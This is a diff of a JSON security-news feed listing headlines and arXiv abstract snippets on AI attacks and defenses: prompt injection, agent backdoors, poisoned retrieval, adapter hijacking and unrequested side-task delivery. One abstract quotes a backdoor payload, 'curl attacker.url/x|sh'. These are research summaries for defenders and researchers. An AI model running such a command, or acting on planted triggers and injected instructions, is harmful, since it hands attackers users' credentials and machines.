@@ -1,5 +1,71 @@
 [
   {
+    "id": "8a67ab33b1cd",
+    "title": "Hackers Exploit ChatGPT and Claude Website Typos to Deliver Malware and Hijack Browsers",
+    "url": "https://gbhackers.com/ai-website-typos-exploited",
+    "source": "GBHackers",
+    "via": "GBHackers",
+    "lang": "en",
+    "published": "2026-11-13T12:05:34Z",
+    "seen": "2026-11-13T12:05:40Z",
+    "summary": "Oleg Zaytsev traced 186 lookalike domains across 27 AI brands, including Claude, ChatGPT, DeepSeek, Perplexity, Midjourney, ElevenLabs and Cursor. He named the delivery pattern TypoPrompting. Ordinary typing errors led visitors to ClickFix lures, browser-hijacking malware and search-hijacking extensions. ChatGPT drew the most lookalikes with 25, followed by Claude with 18 and DeepSeek with 16. The"
+  },
+  {
+    "id": "f5b71ee6de0e",
+    "title": "AI Doesn’t Have to Go Rogue to Break the World",
+    "url": "https://www.schneier.com/blog/archives/2026/11/ai-doesnt-have-to-go-rogue-to-break-the-world.html",
+    "source": "Schneier on Security",
+    "via": "Schneier on Security",
+    "lang": "en",
+    "published": "2026-11-13T12:03:30Z",
+    "seen": "2026-11-13T12:05:40Z",
+    "summary": "This essay is adapted from a keynote speech delivered at the DEF CON 34 conference in Las Vegas on August 7, 2026. The essay originally appeared in CyberScoop . I want to talk about AI hacking. There are three aspects: people hacking AI systems, people using AI to hack other systems, and AIs hacking systems on their own, not even maliciously. The last two matter more than the first. The third is t"
+  },
+  {
+    "id": "fea4503784f5",
+    "title": "ИИ взламывает ИИ: OpenAI и Anthropic раскрыли результаты экспериментов",
+    "url": "https://news.google.com/rss/articles/CBMilwFBVV95cUxOUmVUdGMzSUstUnM1S0x4MFd2WDYwbkNOUzRVcld5dFpDYmF5UGVjcHU1NjRYWmkwVFRjUWJjRWhDRVlEQk9PZGdDSlpvNUhUaV9RbG5jV0h6cnc0elV4WWZjSFBhSDh1aTVYVkkybmMzWmJ5OHV1bnhYTDVaMTE1S0pKSlE4amVqOWdKNmtrQUhmU1lOVVpZ0gGWAUFVX3lxTE5hSkV5cjR2OGJqVGQyM2x0U0s1R3ctcEtYcDhIeHhVemdaSUUwU0NETkVQc0lzQ0lYZ2dmdDJhQlJRNEdQbmlETzJLaml1QktIY0xUaHl2VXZTb1dzMUJ4aWNNRENPQXFoMDVqbDQ3alhDTzdHMUdhWU1TYmF1WlZWQVZfdE5VY1JCWVAyMmRyMmpSVEdxQQ?oc=5",
+    "source": "BES.media",
+    "via": "Google News (Русский)",
+    "lang": "ru",
+    "published": "2026-11-13T11:44:35Z",
+    "seen": "2026-11-13T12:05:40Z",
+    "summary": ""
+  },
+  {
+    "id": "0df9519984fe",
+    "title": "英伟达GPU驱动高危漏洞警示算力安全：云主机、AI租赁与数据中心面临治理大考",
+    "url": "https://news.google.com/rss/articles/CBMiiAFBVV95cUxPX2NwOExaUF9HZ2RnQ0lMV01rLUxvNHZzQWtGYlhPNURoQktWRlBvZFdpU3BFMTZCWWY1eXFuVWF4WDh2V0RQVWVIS211dlJ4YUQyeHR4SDRzUnJtQ0RmeUNLVkpSWDVUV1I0VTZob1FSWVFpQnZyWWlyUlZjUG5pT2VjOWFvOGs0?oc=5",
+    "source": "Sohu",
+    "via": "Google News (中文)",
+    "lang": "zh",
+    "published": "2026-11-13T11:23:00Z",
+    "seen": "2026-11-13T12:05:40Z",
+    "summary": ""
+  },
+  {
+    "id": "225ea415057a",
+    "title": "Anthropic新AI红客来了！只用人类1/235的请求量，就找到严重漏洞",
+    "url": "https://news.google.com/rss/articles/CBMiSEFVX3lxTE1xUDdDTkFTNS1pTDZuaVh3RHQwTDJIYjBBYkMyREZaX0Y0cGNodC1LaW9kOGsyUTFPSE9MblpPUkVFQjdITDcwWA?oc=5",
+    "source": "智东西",
+    "via": "Google News (中文)",
+    "lang": "zh",
+    "published": "2026-11-13T04:16:10Z",
+    "seen": "2026-11-13T12:05:40Z",
+    "summary": ""
+  },
+  {
+    "id": "d0ce737c6215",
+    "title": "Forescout unveils research into AI vulnerability discovery",
+    "url": "https://news.google.com/rss/articles/CBMifEFVX3lxTFBLeERTbVB1N3dWOF9adDhDTF90MUtqeU1JaDRyZ0RsSGdWMVpmbkRhN3hua3h1cjZMTmhEdW9nRmpMaXI1WHdHLVphM01LWm9oa0xDbHpjbzVxeXdUOG5VV21VbGIyUU5Xall4dUo2QUtHUnBRMTh6T0I1T2Q?oc=5",
+    "source": "Security Journal Americas",
+    "via": "Google News (English)",
+    "lang": "en",
+    "published": "2026-11-12T22:30:02Z",
+    "seen": "2026-11-13T12:05:40Z",
+    "summary": ""
+  },
+  {
     "id": "10448c0b2779",
     "title": "The federal government wants you to use its chatbot to report fraud",
     "url": "https://news.google.com/rss/articles/CBMipwFBVV95cUxQNDBqRjhCNW5YX3IwNnliUHROZU1CcEVxRG4yVndVbHJoMExsbGV3LTNKdnhYSmsxV0l4LW5jRWdKZ3hBLUV0Y1BDUFF4NFVwLVdoQzlEQ2xCcmFuNTFqMG1ScWs3RVBHcmF6ZkhJV0R0SklrTV81SmF0T3Mtb2JHc1VwcDVQYnBna29XWkxWa0xJN1M0Zlg4WFlhbXZIdlNZQ25UUWlCQQ?oc=5",
@@ -715,202 +781,15 @@
     "summary": ""
   },
   {
-    "id": "516699b21e96",
-    "title": "Semantic Overlays: Mitigating Prompt Injection with Annotations Beyond Tokens and Steering Vectors",
-    "url": "https://arxiv.org/abs/2608.23873",
+    "id": "4400e6db46d9",
+    "title": "SideTaskBench: Measuring Unauthorized Side-Task Delivery in Coding Agents",
+    "url": "https://arxiv.org/abs/2611.14548",
     "source": "arXiv cs.CR",
     "via": "arXiv cs.CR",
     "lang": "en",
     "published": "2026-11-13T05:00:00Z",
     "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2608.23873v4 Announce Type: replace-cross Abstract: Language models see only tokens. But the harness knows more: which token spans are user text, which are tool outputs, and which come from untrusted sources such as web pages or external documents. To pass that knowledge to the model, the harness must transmit it as plain text. Prompt injection exploits this: planted instructions, formatted "
-  },
-  {
-    "id": "0ed314763402",
-    "title": "Sequential Membership Inference Attacks",
-    "url": "https://arxiv.org/abs/2602.16596",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2602.16596v3 Announce Type: replace-cross Abstract: Modern AI models are not static. They go through multiple updates in their lifecycles. We propose to design Sequential Membership Inference (SeMI) attacks leading to tighter privacy audits by exploiting the sequence of models and injecting a target canary at a controlled insertion time. First, for empirical mean computation, we develop SeMI"
-  },
-  {
-    "id": "a059596c95ca",
-    "title": "DataCook: Exploring Anti-Adversarial Fingerprints for Healthcare Data Usage Control",
-    "url": "https://arxiv.org/abs/2403.17755",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2403.17755v2 Announce Type: replace-cross Abstract: Purpose: Healthcare AI increasingly relies on high-quality datasets, yet medical data are scarce, costly to curate, and tightly regulated in terms of data access. More critically, once medical data are leaked or accessed without authorization, data owners have limited means to prevent such data from being used to train and deploy downstream"
-  },
-  {
-    "id": "ed28ba28df63",
-    "title": "Approximate and Weighted Data Reconstruction Attack in Federated Learning",
-    "url": "https://arxiv.org/abs/2308.06822",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2308.06822v4 Announce Type: replace-cross Abstract: Federated Learning (FL) is a distributed learning paradigm that enables multiple clients to collaborate on building a machine learning model without sharing their private data. Although FL is considered privacy-preserved by design, recent data reconstruction attacks demonstrate that an attacker can recover clients' training data based on th"
-  },
-  {
-    "id": "f633247c73b0",
-    "title": "Analyzing and Mitigating Poisoning Attacks on Flow-Based Intrusion Detection",
-    "url": "https://arxiv.org/abs/2610.19766",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2610.19766v2 Announce Type: replace Abstract: Although Artificial Intelligence (AI)-based Intrusion Detection Systems (IDSs) are increasingly deployed in operational networks, their dependence on large-scale training data introduces a critical vulnerability to stealthy poisoning attacks. We demonstrate that latent backdoors can be successfully implanted in flow-based IDS models by poisoning "
-  },
-  {
-    "id": "2ad941f9ad89",
-    "title": "Quantum Machine Learning Protection of Military Quantum Key Distribution Against Cryptographically Camouflaged Attacks",
-    "url": "https://arxiv.org/abs/2610.04543",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2610.04543v2 Announce Type: replace Abstract: Quantum key distribution proves its protocol secure and says nothing about the hardware beneath it, so military and government operators fielding it for command-and-control keys monitor the channel for implementation attacks, and that monitoring has a blind spot. An adversary with a kleptographic foothold in the generator of a public per-block va"
-  },
-  {
-    "id": "97d3c2a1ce2b",
-    "title": "CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts",
-    "url": "https://arxiv.org/abs/2611.17115",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.17115v1 Announce Type: cross Abstract: Enforcement defenses against prompt injection, such as CaMeL, Progent, IPIGuard and DRIFT, ask the agent's own model to write a security artifact (a program, a privilege policy, a dependency graph or a constraint list) that code then enforces. We ask whether small language model (SLM) agents can be trusted to write these artifacts. Across 15 open-w"
-  },
-  {
-    "id": "527b2b2f22d2",
-    "title": "Bait: Mitigating Harmful Agentic Reinforcement Learning via Probing Reward Function",
-    "url": "https://arxiv.org/abs/2611.16369",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.16369v1 Announce Type: cross Abstract: We expose a safety vulnerability on nascent agentic reinforcement-learning-as-a-service. Specifically, with a cost as low as \\$20, we show that safety alignment of a large language model (e.g., Inkling) can be completely subverted through rounds of harmful agentic reinforcement learning (agentic RL) with a toxic environment from its users. We also "
-  },
-  {
-    "id": "89f40a182971",
-    "title": "Poison-then-Hide: Finetuning-Activated Backdoor Attack on Pretrained Vision Encoders",
-    "url": "https://arxiv.org/abs/2611.14970",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.14970v1 Announce Type: cross Abstract: Backdoor attacks threaten the integrity of machine learning models by allowing attackers to control model behavior through triggers. Models can be compromised during finetuning by backdoor attacks through either poisoned data or adversarial training objectives. Because existing finetuning-activated attacks assume limited domain shift or frozen enco"
-  },
-  {
-    "id": "1f867793f0b1",
-    "title": "Fault Injection Attacks on Q-Learning: Analysis, Vulnerabilities, and Countermeasures",
-    "url": "https://arxiv.org/abs/2611.16151",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.16151v1 Announce Type: new Abstract: Hardware fault injection attacks threaten machine learning systems, yet their impact on reinforcement learning (RL) has received little attention despite the use of RL in safety-critical applications. This paper presents a security analysis of Q-Learning implementations under voltage and clock glitching attacks on a ChipWhisperer platform, evaluating"
-  },
-  {
-    "id": "17680564150f",
-    "title": "Intent-Aware Protection for AI Agents",
-    "url": "https://arxiv.org/abs/2611.16122",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.16122v1 Announce Type: new Abstract: AI agents increasingly access enterprise data, invoke powerful tools, and act with limited human oversight. Existing security defenses primarily detect prompt injection, harmful outputs, or suspicious behavior, but do not determine whether an agent remains faithful to the purpose for which it was deployed. An action may contain no attack pattern and "
-  },
-  {
-    "id": "b3e4088c754f",
-    "title": "Privacy Leakage from Recurrent State in LLM Inference",
-    "url": "https://arxiv.org/abs/2611.16048",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.16048v1 Announce Type: new Abstract: Personalized LLM services place private facts and application instructions into a prompt, then retain representations of that context for later inference. Latent-state LLMs compress part of this history into fixed-size recurrent state. The information preserved by its learned updates is implicit, and later computation can expose it even when an obser"
-  },
-  {
-    "id": "c2fe68c72231",
-    "title": "Your Secrets Are Showing: Deep Image Hiding Models Are Surprisingly Easy to Attack",
-    "url": "https://arxiv.org/abs/2611.15583",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.15583v1 Announce Type: new Abstract: In this work, we ask whether an attacker can go beyond detecting a hidden image and tell what it depicts, even without knowing which model hid it. We show that, for deep image hiding, this is surprisingly easy. To test this, we build an evaluation dataset of stego images generated by 11 hiding models. These models span two families (invertible neural"
-  },
-  {
-    "id": "40cceebf4eb7",
-    "title": "SecDVA: A Maliciously Secure Multi-Party Framework for Data Value Assessment in Modern Machine Learning Data Markets",
-    "url": "https://arxiv.org/abs/2611.15373",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.15373v1 Announce Type: new Abstract: Data Value Assessment (DVA) plays a critical role in modern data markets by enabling buyers to evaluate how a seller's data would improve model performance before purchase. However, existing DVA approaches require one party to reveal the data or model, exposing participants to privacy leakage, strategic manipulation, and high deployment costs. These "
-  },
-  {
-    "id": "754b16649529",
-    "title": "Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents",
-    "url": "https://arxiv.org/abs/2611.15118",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.15118v1 Announce Type: new Abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third partie"
-  },
-  {
-    "id": "214f6230196a",
-    "title": "One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems",
-    "url": "https://arxiv.org/abs/2611.15102",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.15102v1 Announce Type: new Abstract: LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. This also opens them to attack. We study the weakest attacker of this kind, who knows only the forecasting question and publishes fabricated news articles, with no access to the model, the retriever or its queries. W"
-  },
-  {
-    "id": "f10b624ecbaf",
-    "title": "Hijacking a Trusted LLM in Real-World Quantized Deployments Only Requires a Disguised Adapter",
-    "url": "https://arxiv.org/abs/2611.14978",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.14978v1 Announce Type: new Abstract: Third-party low-rank adaptation (LoRA) adapters are tailored to perform decision tasks such as content moderation and function selection. However, in the real world, quantized deployments carry a potential threat in that an adapter can pass an audit with the unquantized base, yet hijack decisions when the same base is quantized for deployment. Demons"
-  },
-  {
-    "id": "4c4847a7d694",
-    "title": "When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents",
-    "url": "https://arxiv.org/abs/2611.14864",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-13T05:00:00Z",
-    "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.14864v1 Announce Type: new Abstract: An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe abstention requires evaluating both the claimed risk and the authority "
+    "summary": "arXiv:2611.14548v1 Announce Type: new Abstract: Can a coding agent fix a user's repository while also completing and delivering work the user never requested? In this paper, we introduce SideTaskBench to measure this failure where third-party technical references induce agents to produce independent side-task artifacts during an authorized repair. Repair success alone misses this behavior. Our key"
   },
   {
     "id": "d3d6070d89b1",
@@ -924,15 +803,202 @@
     "summary": "arXiv:2611.14808v1 Announce Type: new Abstract: Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because the agent autonomously decides when to stop, a malicious tenant can send a"
   },
   {
-    "id": "4400e6db46d9",
-    "title": "SideTaskBench: Measuring Unauthorized Side-Task Delivery in Coding Agents",
-    "url": "https://arxiv.org/abs/2611.14548",
+    "id": "4c4847a7d694",
+    "title": "When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents",
+    "url": "https://arxiv.org/abs/2611.14864",
     "source": "arXiv cs.CR",
     "via": "arXiv cs.CR",
     "lang": "en",
     "published": "2026-11-13T05:00:00Z",
     "seen": "2026-11-13T07:53:16Z",
-    "summary": "arXiv:2611.14548v1 Announce Type: new Abstract: Can a coding agent fix a user's repository while also completing and delivering work the user never requested? In this paper, we introduce SideTaskBench to measure this failure where third-party technical references induce agents to produce independent side-task artifacts during an authorized repair. Repair success alone misses this behavior. Our key"
+    "summary": "arXiv:2611.14864v1 Announce Type: new Abstract: An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe abstention requires evaluating both the claimed risk and the authority "
+  },
+  {
+    "id": "f10b624ecbaf",
+    "title": "Hijacking a Trusted LLM in Real-World Quantized Deployments Only Requires a Disguised Adapter",
+    "url": "https://arxiv.org/abs/2611.14978",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.14978v1 Announce Type: new Abstract: Third-party low-rank adaptation (LoRA) adapters are tailored to perform decision tasks such as content moderation and function selection. However, in the real world, quantized deployments carry a potential threat in that an adapter can pass an audit with the unquantized base, yet hijack decisions when the same base is quantized for deployment. Demons"
+  },
+  {
+    "id": "214f6230196a",
+    "title": "One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems",
+    "url": "https://arxiv.org/abs/2611.15102",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.15102v1 Announce Type: new Abstract: LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. This also opens them to attack. We study the weakest attacker of this kind, who knows only the forecasting question and publishes fabricated news articles, with no access to the model, the retriever or its queries. W"
+  },
+  {
+    "id": "754b16649529",
+    "title": "Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents",
+    "url": "https://arxiv.org/abs/2611.15118",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.15118v1 Announce Type: new Abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third partie"
+  },
+  {
+    "id": "40cceebf4eb7",
+    "title": "SecDVA: A Maliciously Secure Multi-Party Framework for Data Value Assessment in Modern Machine Learning Data Markets",
+    "url": "https://arxiv.org/abs/2611.15373",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.15373v1 Announce Type: new Abstract: Data Value Assessment (DVA) plays a critical role in modern data markets by enabling buyers to evaluate how a seller's data would improve model performance before purchase. However, existing DVA approaches require one party to reveal the data or model, exposing participants to privacy leakage, strategic manipulation, and high deployment costs. These "
+  },
+  {
+    "id": "c2fe68c72231",
+    "title": "Your Secrets Are Showing: Deep Image Hiding Models Are Surprisingly Easy to Attack",
+    "url": "https://arxiv.org/abs/2611.15583",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.15583v1 Announce Type: new Abstract: In this work, we ask whether an attacker can go beyond detecting a hidden image and tell what it depicts, even without knowing which model hid it. We show that, for deep image hiding, this is surprisingly easy. To test this, we build an evaluation dataset of stego images generated by 11 hiding models. These models span two families (invertible neural"
+  },
+  {
+    "id": "b3e4088c754f",
+    "title": "Privacy Leakage from Recurrent State in LLM Inference",
+    "url": "https://arxiv.org/abs/2611.16048",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.16048v1 Announce Type: new Abstract: Personalized LLM services place private facts and application instructions into a prompt, then retain representations of that context for later inference. Latent-state LLMs compress part of this history into fixed-size recurrent state. The information preserved by its learned updates is implicit, and later computation can expose it even when an obser"
+  },
+  {
+    "id": "17680564150f",
+    "title": "Intent-Aware Protection for AI Agents",
+    "url": "https://arxiv.org/abs/2611.16122",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.16122v1 Announce Type: new Abstract: AI agents increasingly access enterprise data, invoke powerful tools, and act with limited human oversight. Existing security defenses primarily detect prompt injection, harmful outputs, or suspicious behavior, but do not determine whether an agent remains faithful to the purpose for which it was deployed. An action may contain no attack pattern and "
+  },
+  {
+    "id": "1f867793f0b1",
+    "title": "Fault Injection Attacks on Q-Learning: Analysis, Vulnerabilities, and Countermeasures",
+    "url": "https://arxiv.org/abs/2611.16151",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.16151v1 Announce Type: new Abstract: Hardware fault injection attacks threaten machine learning systems, yet their impact on reinforcement learning (RL) has received little attention despite the use of RL in safety-critical applications. This paper presents a security analysis of Q-Learning implementations under voltage and clock glitching attacks on a ChipWhisperer platform, evaluating"
+  },
+  {
+    "id": "89f40a182971",
+    "title": "Poison-then-Hide: Finetuning-Activated Backdoor Attack on Pretrained Vision Encoders",
+    "url": "https://arxiv.org/abs/2611.14970",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.14970v1 Announce Type: cross Abstract: Backdoor attacks threaten the integrity of machine learning models by allowing attackers to control model behavior through triggers. Models can be compromised during finetuning by backdoor attacks through either poisoned data or adversarial training objectives. Because existing finetuning-activated attacks assume limited domain shift or frozen enco"
+  },
+  {
+    "id": "527b2b2f22d2",
+    "title": "Bait: Mitigating Harmful Agentic Reinforcement Learning via Probing Reward Function",
+    "url": "https://arxiv.org/abs/2611.16369",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.16369v1 Announce Type: cross Abstract: We expose a safety vulnerability on nascent agentic reinforcement-learning-as-a-service. Specifically, with a cost as low as \\$20, we show that safety alignment of a large language model (e.g., Inkling) can be completely subverted through rounds of harmful agentic reinforcement learning (agentic RL) with a toxic environment from its users. We also "
+  },
+  {
+    "id": "97d3c2a1ce2b",
+    "title": "CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts",
+    "url": "https://arxiv.org/abs/2611.17115",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2611.17115v1 Announce Type: cross Abstract: Enforcement defenses against prompt injection, such as CaMeL, Progent, IPIGuard and DRIFT, ask the agent's own model to write a security artifact (a program, a privilege policy, a dependency graph or a constraint list) that code then enforces. We ask whether small language model (SLM) agents can be trusted to write these artifacts. Across 15 open-w"
+  },
+  {
+    "id": "2ad941f9ad89",
+    "title": "Quantum Machine Learning Protection of Military Quantum Key Distribution Against Cryptographically Camouflaged Attacks",
+    "url": "https://arxiv.org/abs/2610.04543",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2610.04543v2 Announce Type: replace Abstract: Quantum key distribution proves its protocol secure and says nothing about the hardware beneath it, so military and government operators fielding it for command-and-control keys monitor the channel for implementation attacks, and that monitoring has a blind spot. An adversary with a kleptographic foothold in the generator of a public per-block va"
+  },
+  {
+    "id": "f633247c73b0",
+    "title": "Analyzing and Mitigating Poisoning Attacks on Flow-Based Intrusion Detection",
+    "url": "https://arxiv.org/abs/2610.19766",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2610.19766v2 Announce Type: replace Abstract: Although Artificial Intelligence (AI)-based Intrusion Detection Systems (IDSs) are increasingly deployed in operational networks, their dependence on large-scale training data introduces a critical vulnerability to stealthy poisoning attacks. We demonstrate that latent backdoors can be successfully implanted in flow-based IDS models by poisoning "
+  },
+  {
+    "id": "ed28ba28df63",
+    "title": "Approximate and Weighted Data Reconstruction Attack in Federated Learning",
+    "url": "https://arxiv.org/abs/2308.06822",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2308.06822v4 Announce Type: replace-cross Abstract: Federated Learning (FL) is a distributed learning paradigm that enables multiple clients to collaborate on building a machine learning model without sharing their private data. Although FL is considered privacy-preserved by design, recent data reconstruction attacks demonstrate that an attacker can recover clients' training data based on th"
+  },
+  {
+    "id": "a059596c95ca",
+    "title": "DataCook: Exploring Anti-Adversarial Fingerprints for Healthcare Data Usage Control",
+    "url": "https://arxiv.org/abs/2403.17755",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2403.17755v2 Announce Type: replace-cross Abstract: Purpose: Healthcare AI increasingly relies on high-quality datasets, yet medical data are scarce, costly to curate, and tightly regulated in terms of data access. More critically, once medical data are leaked or accessed without authorization, data owners have limited means to prevent such data from being used to train and deploy downstream"
+  },
+  {
+    "id": "0ed314763402",
+    "title": "Sequential Membership Inference Attacks",
+    "url": "https://arxiv.org/abs/2602.16596",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2602.16596v3 Announce Type: replace-cross Abstract: Modern AI models are not static. They go through multiple updates in their lifecycles. We propose to design Sequential Membership Inference (SeMI) attacks leading to tighter privacy audits by exploiting the sequence of models and injecting a target canary at a controlled insertion time. First, for empirical mean computation, we develop SeMI"
+  },
+  {
+    "id": "516699b21e96",
+    "title": "Semantic Overlays: Mitigating Prompt Injection with Annotations Beyond Tokens and Steering Vectors",
+    "url": "https://arxiv.org/abs/2608.23873",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-13T05:00:00Z",
+    "seen": "2026-11-13T07:53:16Z",
+    "summary": "arXiv:2608.23873v4 Announce Type: replace-cross Abstract: Language models see only tokens. But the harness knows more: which token spans are user text, which are tool outputs, and which come from untrusted sources such as web pages or external documents. To pass that knowledge to the model, the harness must transmit it as plain text. Prompt injection exploits this: planted instructions, formatted "
   },
   {
     "id": "fe7b58132af7",
@@ -1397,23 +1463,23 @@
     "summary": ""
   },
   {
-    "id": "fe45447abd8e",
-    "title": "Fireworks AI发生数据泄露：部分客户信息被窃，Notion约1%用户受影响",
